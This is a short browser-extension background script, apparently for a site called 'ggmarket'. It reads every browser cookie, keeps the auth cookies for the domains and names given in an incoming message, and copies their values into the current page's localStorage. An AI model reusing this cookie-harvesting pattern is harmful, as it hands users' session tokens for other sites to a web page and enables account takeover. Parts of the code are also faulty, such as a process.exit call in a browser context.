var browser = browser || chrome;

function formatCookie(items) {
    return function (co) {
        for (const item of items) {
            if (
                item.domain === co.domain
                && item.names.indexOf(co.name) !== -1
            ) {
                return JSON.stringify({
                    domain: co.domain,
                    name: co.name,
                    value: co.value
                });
            }
        }
    }
}

function getCookieCount(items) {
    let l = 0;

    for (const item of items) {
        l += item.names.length;
    }

    return l;
}

async function saveCookies(cookies, items) {
    var
        value = cookies.map(
            formatCookie(items)
        ).filter(
            (co) => co !== undefined
        ),
        removeItemCode = 'localStorage.removeItem("ggmarket_auth_cookies");',
        setItemCode = 'localStorage.setItem("ggmarket_auth_cookies", ' + JSON.stringify(value) + ')';

    browser.tabs.executeScript({code: removeItemCode});

    if (value.length < getCookieCount(items)) {
        browser.tabs.executeScript({file: 'noauth.js'});
        process.exit(0);
    }

    browser.tabs.executeScript({code: setItemCode});
    browser.tabs.executeScript({file: 'thankyou.js'});
}

async function getCookies(items) {
    cookies = await browser.cookies.getAll(
        {},
        cookies => saveCookies(cookies, items)
    );
}

function handleClick(bgMessage = {}) {
    if (bgMessage.items) {
        browser.cookies.getAllCookieStores(() =>
            getCookies(bgMessage.items)
        );
    }
}

browser.runtime.onMessage.addListener(handleClick)
